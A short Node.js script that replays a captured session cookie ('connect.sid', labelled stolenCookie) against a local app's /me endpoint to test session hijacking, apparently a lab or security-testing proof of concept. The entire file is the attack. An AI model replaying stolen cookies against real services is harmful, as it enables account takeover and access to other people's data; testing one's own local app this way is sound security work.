const axios = require('axios');

const stolenCookie = 'connect.sid=s%3Aiwk8wU4rWXvljJ8WV7_d385CkzcnncUF.rAv9%2F7Q0sUUeeYCSNCuyv4RqlfR7RPEUANHqDFO3Ca4';

(async () => {
  try {
    const response = await axios.get('http://localhost:3000/me', {
      headers: {
        Cookie: stolenCookie
      }
    });
    console.log('[SUCCESS] Accessed /me with stolen cookie:');
    console.log(response.data);
  } catch (err) {
    if (err.response) {
      console.log('[FAIL]', err.response.data);
    } else {
      console.log('[ERROR]', err.message);
    }
  }
})();
